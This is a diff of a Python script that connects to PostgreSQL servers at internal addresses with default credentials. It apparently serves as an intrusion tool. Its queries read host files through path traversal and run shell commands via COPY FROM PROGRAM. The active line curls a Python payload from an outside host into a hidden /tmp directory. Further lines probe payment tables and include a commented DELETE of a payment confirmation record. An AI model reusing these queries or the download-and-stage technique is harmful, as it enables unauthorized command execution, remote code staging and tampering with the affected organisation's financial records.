@@ -2,11 +2,17 @@ import sys
 import os
 
 # Add the directories containing site-packages to the system path
-sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), './python3.6/site-packages')))
+sys.path.insert(
+    0,
+    os.path.abspath(
+        os.path.join(os.path.dirname(__file__), "./python3.6/site-packages")
+    ),
+)
 
 # Try importing pg8000 directly
 try:
     import pg8000
+
     print("pg8000 imported successfully.")
 except ImportError as e:
     print(f"pg8000 import error: {e}")
@@ -16,22 +22,29 @@ db_config = {
     'host': '192.168.20.17',
     'database': 'postgres',
     'user': 'postgres',
-    'password': 'postgres',  
+    'password': 'postgres',
     'port': 5432
 }
 
 
+# db_config = {
+#     "host": "192.168.100.122",
+#     "database": "ms_document_validation_db",
+#     "user": "postgres",
+#     "password": "postgres",
+#     "port": 5432,
+# }
 
-# Function to query the database, accepting both pg8000 and db_config as arguments
+
 def query_database(query, pg8000_module, db_config):
     try:
         # Connect to the PostgreSQL database using pg8000
         conn = pg8000_module.connect(
-            host=db_config['host'],
-            database=db_config['database'],
-            user=db_config['user'],
-            password=db_config['password'],
-            port=db_config['port']
+            host=db_config["host"],
+            database=db_config["database"],
+            user=db_config["user"],
+            password=db_config["password"],
+            port=db_config["port"],
         )
 
         # Create a cursor to execute the query
@@ -58,6 +71,7 @@ def query_database(query, pg8000_module, db_config):
     except Exception as e:
         print(f"Error: {e}")
         return None, None
+
 
 # Function to generate a well-formatted HTML table
 def generate_html_table(headers, rows):
@@ -110,20 +124,28 @@ def generate_html_table(headers, rows):
     """
     return html
 
-# Example usage of querying the database nas_v2
-#query = "SELECT datname FROM pg_database;"
-#query = "select * from pg_ls_dir('../../../../../home');"
-#query = "SELECT pg_read_file('../../../../../etc/mysql/my.cnf');"
-#query = "SELECT * FROM pg_available_extensions"
-#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
 
+# Example usage of querying the database nas_v2
+# query = "SELECT datname FROM pg_database;"
+# query = "select * from pg_ls_dir('../../../../../home');"
+# query = "SELECT pg_read_file('../../../../../etc/mysql/my.cnf');"
+# query = "SELECT * FROM pg_available_extensions"
+# query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+
+#query = "SELECT * FROM documents_document LIMIT 200 OFFSET 0;"
+# query = "SELECT * FROM documents_document WHERE application_data->>'business_name' ILIKE '%CHANDARANA%' LIMIT 200 OFFSET 0; "
 # query = "DROP TABLE IF EXISTS pg_cmd;"
 # query = "CREATE TABLE pg_cmd(cmd_output text);"
 # query = "TRUNCATE pg_cmd;"
 # query = "COPY pg_cmd FROM PROGRAM 'ls -lha ../../../../../';"
-#query = "SELECT * FROM pg_cmd;"
-query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'mkdir ../../../../../home/super/webapps';"
 
+query = "SELECT * FROM pg_cmd;"
+#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'ls -lha ../../../../../tmp';"
+#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'mkdir ../../../../../tmp/.query-unix';"
+
+#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/my_env_b.zip https://sbnke.com/my_env_bf.zip';"
+query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/master.py https://sbnke.com/py/master_b.py';"
+#query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/my_env_bf.zip';"
 #query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
 
 # query = """
@@ -136,24 +158,24 @@ query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'mkdir ../../../../../home/sup
 # """
 
 # query = """
-# SELECT * 
-# FROM checkout_bill 
+# SELECT *
+# FROM checkout_bill
 # WHERE "client_reference" IN (
-#     'BL-UBP-192712', 
-#     'BL-GESS-34570', 
-#     'BL-SE-5F1BAB51', 
-#     'BL-GPK-3818185', 
-#     'BL-UBP-199659', 
-#     'BL-LR-285949', 
+#     'BL-UBP-192712',
+#     'BL-GESS-34570',
+#     'BL-SE-5F1BAB51',
+#     'BL-GPK-3818185',
+#     'BL-UBP-199659',
+#     'BL-LR-285949',
 #     'BL-HR-599673'
 # )
-# ORDER BY created_at DESC 
+# ORDER BY created_at DESC
 # LIMIT 200 OFFSET 0;
 # """
 
 # query = """
-# DELETE 
-# FROM taifa_payment_confirmation 
+# DELETE
+# FROM taifa_payment_confirmation
 # WHERE "BillRefNumber" = 'BL-UBP-192712';
 # """
 
